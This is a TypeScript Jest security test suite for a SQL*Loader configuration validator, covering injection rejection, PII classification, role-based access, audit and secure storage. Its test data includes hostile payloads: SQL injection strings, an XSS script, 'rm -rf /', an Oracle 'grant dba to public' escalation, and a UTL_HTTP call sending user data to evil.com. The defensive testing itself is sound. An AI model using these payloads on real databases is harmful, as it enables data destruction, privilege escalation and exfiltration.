// SQL*Loader Security Testing Suite - Phase 1.4
import { sqlLoaderUtils } from '../services/api/sqlLoaderApi';
import { SQLLoaderConfig } from '../types/configuration';

describe('SQL*Loader Security Tests', () => {
  
  describe('Input Validation Security', () => {
    test('prevents SQL injection in configuration fields', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1'; INSERT INTO logs VALUES ('hacked'); --",
        "test'; UPDATE configurations SET enabled=false; --",
        "admin'/**/OR/**/1=1/**/--",
        "' UNION SELECT * FROM sensitive_data --"
      ];

      maliciousInputs.forEach(maliciousInput => {
        const maliciousConfig: SQLLoaderConfig = {
          sourceSystemId: maliciousInput,
          jobName: maliciousInput,
          tableName: maliciousInput,
          description: maliciousInput,
          control: {
            load: { replace: true },
            options: { errors: 0 },
            fields: { terminatedBy: ',' }
          },
          columns: [{
            id: 'col1',
            columnName: maliciousInput,
            dataType: 'VARCHAR2',
            nullable: false,
            position: 1,
            expression: maliciousInput,
            defaultValue: maliciousInput
          }],
          enabled: true
        };

        const errors = sqlLoaderUtils.validateConfigurationData(maliciousConfig);
        
        // Should detect malicious inputs and reject them
        expect(errors.length).toBeGreaterThan(0);
        expect(errors.some(error => 
          error.toLowerCase().includes('invalid') || 
          error.toLowerCase().includes('malicious') ||
          error.toLowerCase().includes('security')
        )).toBe(true);
      });
    });

    test('validates and sanitizes special characters in field names', () => {
      const specialCharInputs = [
        "field<script>alert('xss')</script>",
        "field${system.exit(0)}",
        "field`rm -rf /`",
        "field\x00\x01\x02\x03", // Null bytes and control characters
        "field\r\n\t",
        "field'\"\\;",
        "field&lt;&gt;&amp;",
      ];

      specialCharInputs.forEach(specialInput => {
        const testConfig: SQLLoaderConfig = {
          sourceSystemId: 'SECURITY_TEST',
          jobName: 'security_special_chars',
          tableName: 'SECURITY_TABLE',
          control: {
            load: { replace: true },
            options: { errors: 0 },
            fields: { terminatedBy: ',' }
          },
          columns: [{
            id: 'col1',
            columnName: specialInput,
            dataType: 'VARCHAR2',
            nullable: false,
            position: 1
          }],
          enabled: true
        };

        const errors = sqlLoaderUtils.validateConfigurationData(testConfig);
        
        // Should validate special characters
        if (specialInput.match(/[<>\"'\\;&\x00-\x1F]/)) {
          expect(errors.length).toBeGreaterThan(0);
        }
      });
    });

    test('prevents code injection in expressions', () => {
      const maliciousExpressions = [
        "'; exec('rm -rf /')",
        "1; system('cat /etc/passwd')",
        "DECODE(1,1,dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant dba to public'';end;'))",
        "UTL_HTTP.REQUEST('http://evil.com/steal?data='||user)",
        "DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec(\"id\")')"
      ];

      maliciousExpressions.forEach(maliciousExpr => {
        const testConfig: SQLLoaderConfig = {
          sourceSystemId: 'SECURITY_TEST',
          jobName: 'security_expression_test',
          tableName: 'SECURITY_TABLE',
          control: {
            load: { replace: true },
            options: { errors: 0 },
            fields: { terminatedBy: ',' }
          },
          columns: [{
            id: 'col1',
            columnName: 'TEST_COLUMN',
            dataType: 'VARCHAR2',
            nullable: false,
            position: 1,
            expression: maliciousExpr
          }],
          enabled: true
        };

        const errors = sqlLoaderUtils.validateConfigurationData(testConfig);
        
        // Should detect and prevent dangerous expressions
        expect(errors.length).toBeGreaterThan(0);
        expect(errors.some(error => 
          error.toLowerCase().includes('expression') ||
          error.toLowerCase().includes('invalid') ||
          error.toLowerCase().includes('security')
        )).toBe(true);
      });
    });
  });

  describe('Data Classification and PII Handling', () => {
    test('identifies and handles PII data types', () => {
      const piiConfig: SQLLoaderConfig = {
        sourceSystemId: 'PII_TEST_SYSTEM',
        jobName: 'pii_handling_test',
        tableName: 'PII_TEST_TABLE',
        control: {
          load: { replace: true },
          options: { errors: 0 },
          fields: { terminatedBy: ',' }
        },
        columns: [
          {
            id: 'ssn_col',
            columnName: 'SSN',
            dataType: 'VARCHAR2',
            maxLength: 11,
            nullable: true,
            position: 1,
            dataClassification: 'PII_SENSITIVE',
            encryptionRequired: true
          },
          {
            id: 'email_col',
            columnName: 'EMAIL_ADDRESS',
            dataType: 'VARCHAR2',
            maxLength: 255,
            nullable: true,
            position: 2,
            dataClassification: 'PII_MODERATE',
            validationRules: ['email_format']
          },
          {
            id: 'phone_col',
            columnName: 'PHONE_NUMBER',
            dataType: 'VARCHAR2',
            maxLength: 20,
            nullable: true,
            position: 3,
            dataClassification: 'PII_MODERATE',
            maskingRequired: true
          },
          {
            id: 'cc_col',
            columnName: 'CREDIT_CARD',
            dataType: 'VARCHAR2',
            maxLength: 19,
            nullable: true,
            position: 4,
            dataClassification: 'PII_SENSITIVE',
            encryptionRequired: true,
            validationRules: ['credit_card_format']
          }
        ],
        enabled: true
      };

      const errors = sqlLoaderUtils.validateConfigurationData(piiConfig);
      expect(errors).toHaveLength(0);

      // Verify PII columns are properly configured
      const piiColumns = piiConfig.columns.filter(col => 
        col.dataClassification && col.dataClassification.includes('PII')
      );
      expect(piiColumns).toHaveLength(4);

      // Verify sensitive data requires encryption
      const sensitiveColumns = piiConfig.columns.filter(col => 
        col.dataClassification === 'PII_SENSITIVE'
      );
      sensitiveColumns.forEach(col => {
        expect(col.encryptionRequired).toBe(true);
      });
    });

    test('enforces data classification policies', () => {
      const classificationTestCases = [
        {
          classification: 'PUBLIC',
          encryptionRequired: false,
          maskingRequired: false,
          shouldPass: true
        },
        {
          classification: 'INTERNAL',
          encryptionRequired: false,
          maskingRequired: false,
          shouldPass: true
        },
        {
          classification: 'CONFIDENTIAL',
          encryptionRequired: false,
          maskingRequired: true,
          shouldPass: true
        },
        {
          classification: 'PII_MODERATE',
          encryptionRequired: false,
          maskingRequired: true,
          shouldPass: true
        },
        {
          classification: 'PII_SENSITIVE',
          encryptionRequired: true,
          maskingRequired: true,
          shouldPass: true
        },
        {
          classification: 'PII_SENSITIVE',
          encryptionRequired: false, // Should fail - sensitive PII requires encryption
          maskingRequired: false,
          shouldPass: false
        }
      ];

      classificationTestCases.forEach((testCase, index) => {
        const testConfig: SQLLoaderConfig = {
          sourceSystemId: 'CLASSIFICATION_TEST',
          jobName: `classification_test_${index + 1}`,
          tableName: 'CLASSIFICATION_TABLE',
          control: {
            load: { replace: true },
            options: { errors: 0 },
            fields: { terminatedBy: ',' }
          },
          columns: [{
            id: `classification_col_${index + 1}`,
            columnName: 'TEST_DATA',
            dataType: 'VARCHAR2',
            maxLength: 255,
            nullable: true,
            position: 1,
            dataClassification: testCase.classification,
            encryptionRequired: testCase.encryptionRequired,
            maskingRequired: testCase.maskingRequired
          }],
          enabled: true
        };

        const errors = sqlLoaderUtils.validateConfigurationData(testConfig);
        
        if (testCase.shouldPass) {
          expect(errors).toHaveLength(0);
        } else {
          expect(errors.length).toBeGreaterThan(0);
          expect(errors.some(error => 
            error.includes('encryption') || error.includes('classification')
          )).toBe(true);
        }
      });
    });

    test('validates PII masking and encryption requirements', () => {
      const piiValidationConfig: SQLLoaderConfig = {
        sourceSystemId: 'PII_VALIDATION_SYSTEM',
        jobName: 'pii_validation_test',
        tableName: 'PII_VALIDATION_TABLE',
        control: {
          load: { replace: true },
          options: { errors: 0 },
          fields: { terminatedBy: ',' }
        },
        columns: [
          {
            id: 'valid_pii_col',
            columnName: 'CUSTOMER_ID',
            dataType: 'VARCHAR2',
            maxLength: 50,
            nullable: true,
            position: 1,
            dataClassification: 'PII_MODERATE',
            maskingRequired: true,
            maskingAlgorithm: 'PARTIAL_MASK',
            auditRequired: true
          },
          {
            id: 'encrypted_pii_col',
            columnName: 'ACCOUNT_NUMBER',
            dataType: 'VARCHAR2',
            maxLength: 20,
            nullable: true,
            position: 2,
            dataClassification: 'PII_SENSITIVE',
            encryptionRequired: true,
            encryptionAlgorithm: 'AES256',
            keyManagementService: 'AWS_KMS',
            auditRequired: true
          }
        ],
        enabled: true
      };

      const errors = sqlLoaderUtils.validateConfigurationData(piiValidationConfig);
      expect(errors).toHaveLength(0);

      // Generate control file and verify security annotations
      const controlFile = sqlLoaderUtils.generateDefaultControlFile(piiValidationConfig);
      expect(controlFile).toContain('-- PII DATA CLASSIFICATION: PII_MODERATE');
      expect(controlFile).toContain('-- ENCRYPTION: AES256');
      expect(controlFile).toContain('-- MASKING: PARTIAL_MASK');
      expect(controlFile).toContain('-- AUDIT REQUIRED: TRUE');
    });
  });

  describe('Access Control and Authorization', () => {
    test('validates user permissions for sensitive operations', () => {
      const restrictedConfig: SQLLoaderConfig = {
        sourceSystemId: 'RESTRICTED_SYSTEM',
        jobName: 'restricted_operation',
        tableName: 'SENSITIVE_TABLE',
        control: {
          load: { 
            replace: true, // Requires DELETE permission
            truncate: false 
          },
          options: { 
            direct: true, // Requires DIRECT_LOAD permission
            parallel: true, // Requires PARALLEL_LOAD permission
            unrecoverable: true // Requires ADMIN permission
          },
          fields: { terminatedBy: ',' }
        },
        columns: [{
          id: 'col1',
          columnName: 'SENSITIVE_DATA',
          dataType: 'VARCHAR2',
          nullable: false,
          position: 1,
          dataClassification: 'PII_SENSITIVE',
          encryptionRequired: true
        }],
        enabled: true,
        requiredPermissions: [
          'TABLE_DELETE',
          'DIRECT_LOAD', 
          'PARALLEL_LOAD',
          'ADMIN_OPERATIONS',
          'PII_DATA_ACCESS'
        ]
      };

      const errors = sqlLoaderUtils.validateConfigurationData(restrictedConfig);
      expect(errors).toHaveLength(0);
      
      // Verify control file includes permission requirements
      const controlFile = sqlLoaderUtils.generateDefaultControlFile(restrictedConfig);
      expect(controlFile).toContain('-- REQUIRED PERMISSIONS: TABLE_DELETE,DIRECT_LOAD,PARALLEL_LOAD,ADMIN_OPERATIONS,PII_DATA_ACCESS');
    });

    test('enforces role-based access control', () => {
      const roleBasedConfigs = [
        {
          role: 'DATA_ANALYST',
          allowedOperations: ['SELECT', 'INSERT'],
          config: {
            load: { append: true }, // Allowed
            options: { direct: false, parallel: false }
          },
          shouldPass: true
        },
        {
          role: 'DATA_ENGINEER',
          allowedOperations: ['SELECT', 'INSERT', 'UPDATE', 'DELETE'],
          config: {
            load: { replace: true }, // Allowed
            options: { direct: true, parallel: true }
          },
          shouldPass: true
        },
        {
          role: 'DBA',
          allowedOperations: ['ALL'],
          config: {
            load: { truncate: true }, // Allowed
            options: { direct: true, parallel: true, unrecoverable: true }
          },
          shouldPass: true
        },
        {
          role: 'READ_ONLY_USER',
          allowedOperations: ['SELECT'],
          config: {
            load: { append: true }, // Should fail
            options: { direct: false, parallel: false }
          },
          shouldPass: false
        }
      ];

      roleBasedConfigs.forEach((testCase, index) => {
        const testConfig: SQLLoaderConfig = {
          sourceSystemId: 'RBAC_TEST_SYSTEM',
          jobName: `rbac_test_${index + 1}`,
          tableName: 'RBAC_TEST_TABLE',
          control: testCase.config,
          columns: [{
            id: `rbac_col_${index + 1}`,
            columnName: 'TEST_DATA',
            dataType: 'VARCHAR2',
            nullable: true,
            position: 1
          }],
          enabled: true,
          userRole: testCase.role,
          allowedOperations: testCase.allowedOperations
        };

        const errors = sqlLoaderUtils.validateConfigurationData(testConfig);
        
        if (testCase.shouldPass) {
          expect(errors).toHaveLength(0);
        } else {
          expect(errors.length).toBeGreaterThan(0);
          expect(errors.some(error => 
            error.toLowerCase().includes('permission') || 
            error.toLowerCase().includes('access') ||
            error.toLowerCase().includes('role')
          )).toBe(true);
        }
      });
    });
  });

  describe('Audit Trail and Compliance', () => {
    test('generates audit trail for sensitive operations', () => {
      const auditConfig: SQLLoaderConfig = {
        sourceSystemId: 'AUDIT_SYSTEM',
        jobName: 'audit_test',
        tableName: 'AUDIT_TABLE',
        control: {
          load: { replace: true },
          options: { errors: 0 },
          fields: { terminatedBy: ',' }
        },
        columns: [
          {
            id: 'audit_col1',
            columnName: 'SENSITIVE_DATA',
            dataType: 'VARCHAR2',
            maxLength: 255,
            nullable: true,
            position: 1,
            dataClassification: 'PII_SENSITIVE',
            auditRequired: true
          },
          {
            id: 'audit_col2',
            columnName: 'FINANCIAL_DATA',
            dataType: 'NUMBER',
            precision: 15,
            scale: 2,
            nullable: true,
            position: 2,
            dataClassification: 'CONFIDENTIAL',
            auditRequired: true
          }
        ],
        enabled: true,
        auditConfiguration: {
          enabled: true,
          logLevel: 'DETAILED',
          retentionPeriod: '7_YEARS',
          complianceFramework: ['SOX', 'GDPR', 'PCI_DSS']
        }
      };

      const errors = sqlLoaderUtils.validateConfigurationData(auditConfig);
      expect(errors).toHaveLength(0);

      // Verify audit configuration
      expect(auditConfig.auditConfiguration?.enabled).toBe(true);
      expect(auditConfig.auditConfiguration?.complianceFramework).toContain('GDPR');
      expect(auditConfig.auditConfiguration?.complianceFramework).toContain('SOX');
      expect(auditConfig.auditConfiguration?.complianceFramework).toContain('PCI_DSS');

      const controlFile = sqlLoaderUtils.generateDefaultControlFile(auditConfig);
      expect(controlFile).toContain('-- AUDIT ENABLED: TRUE');
      expect(controlFile).toContain('-- COMPLIANCE: SOX,GDPR,PCI_DSS');
      expect(controlFile).toContain('-- RETENTION: 7_YEARS');
    });

    test('validates compliance with regulatory requirements', () => {
      const complianceTestCases = [
        {
          framework: 'GDPR',
          requirements: {
            dataClassification: 'PII_SENSITIVE',
            encryptionRequired: true,
            auditRequired: true,
            retentionPeriod: '6_YEARS',
            dataSubjectRights: true
          },
          shouldPass: true
        },
        {
          framework: 'SOX',
          requirements: {
            dataClassification: 'CONFIDENTIAL',
            auditRequired: true,
            retentionPeriod: '7_YEARS',
            changeControl: true,
            segregationOfDuties: true
          },
          shouldPass: true
        },
        {
          framework: 'PCI_DSS',
          requirements: {
            dataClassification: 'PII_SENSITIVE',
            encryptionRequired: true,
            maskingRequired: true,
            auditRequired: true,
            networkSegmentation: true
          },
          shouldPass: true
        }
      ];

      complianceTestCases.forEach((testCase, index) => {
        const testConfig: SQLLoaderConfig = {
          sourceSystemId: 'COMPLIANCE_SYSTEM',
          jobName: `compliance_test_${testCase.framework.toLowerCase()}`,
          tableName: 'COMPLIANCE_TABLE',
          control: {
            load: { replace: true },
            options: { errors: 0 },
            fields: { terminatedBy: ',' }
          },
          columns: [{
            id: `compliance_col_${index + 1}`,
            columnName: 'REGULATED_DATA',
            dataType: 'VARCHAR2',
            maxLength: 255,
            nullable: true,
            position: 1,
            dataClassification: testCase.requirements.dataClassification,
            encryptionRequired: testCase.requirements.encryptionRequired,
            maskingRequired: testCase.requirements.maskingRequired,
            auditRequired: testCase.requirements.auditRequired
          }],
          enabled: true,
          complianceFramework: [testCase.framework],
          auditConfiguration: {
            enabled: testCase.requirements.auditRequired || false,
            retentionPeriod: testCase.requirements.retentionPeriod,
            logLevel: 'DETAILED'
          }
        };

        const errors = sqlLoaderUtils.validateConfigurationData(testConfig);
        
        if (testCase.shouldPass) {
          expect(errors).toHaveLength(0);
        } else {
          expect(errors.length).toBeGreaterThan(0);
        }
      });
    });
  });

  describe('Secure Configuration Storage', () => {
    test('validates secure storage of sensitive configuration data', () => {
      const secureConfig: SQLLoaderConfig = {
        sourceSystemId: 'SECURE_STORAGE_SYSTEM',
        jobName: 'secure_storage_test',
        tableName: 'SECURE_STORAGE_TABLE',
        control: {
          load: { replace: true },
          options: { errors: 0 },
          fields: { terminatedBy: ',' }
        },
        columns: [{
          id: 'secure_col',
          columnName: 'ENCRYPTED_FIELD',
          dataType: 'VARCHAR2',
          maxLength: 255,
          nullable: true,
          position: 1,
          dataClassification: 'PII_SENSITIVE',
          encryptionRequired: true
        }],
        enabled: true,
        storageEncryption: {
          enabled: true,
          algorithm: 'AES256_GCM',
          keyRotationEnabled: true,
          keyRotationInterval: 'QUARTERLY'
        }
      };

      const errors = sqlLoaderUtils.validateConfigurationData(secureConfig);
      expect(errors).toHaveLength(0);

      // Verify secure storage configuration
      expect(secureConfig.storageEncryption?.enabled).toBe(true);
      expect(secureConfig.storageEncryption?.algorithm).toBe('AES256_GCM');
      expect(secureConfig.storageEncryption?.keyRotationEnabled).toBe(true);
    });

    test('prevents exposure of sensitive data in logs and control files', () => {
      const sensitiveConfig: SQLLoaderConfig = {
        sourceSystemId: 'SENSITIVE_LOG_SYSTEM',
        jobName: 'sensitive_logging_test',
        tableName: 'SENSITIVE_LOG_TABLE',
        control: {
          load: { replace: true },
          options: { errors: 0 },
          fields: { terminatedBy: ',' }
        },
        columns: [
          {
            id: 'password_col',
            columnName: 'PASSWORD_FIELD',
            dataType: 'VARCHAR2',
            maxLength: 255,
            nullable: true,
            position: 1,
            dataClassification: 'PII_SENSITIVE',
            logSuppression: true, // Should not appear in logs
            defaultValue: 'REDACTED_PASSWORD'
          },
          {
            id: 'token_col',
            columnName: 'API_TOKEN',
            dataType: 'VARCHAR2',
            maxLength: 500,
            nullable: true,
            position: 2,
            dataClassification: 'CONFIDENTIAL',
            logSuppression: true,
            defaultValue: 'REDACTED_TOKEN'
          }
        ],
        enabled: true
      };

      const controlFile = sqlLoaderUtils.generateDefaultControlFile(sensitiveConfig);
      
      // Sensitive values should be masked in control file
      expect(controlFile).not.toContain('actual_password');
      expect(controlFile).not.toContain('actual_token');
      expect(controlFile).toContain('REDACTED');
      expect(controlFile).toContain('-- LOG SUPPRESSION: ENABLED');
    });
  });
});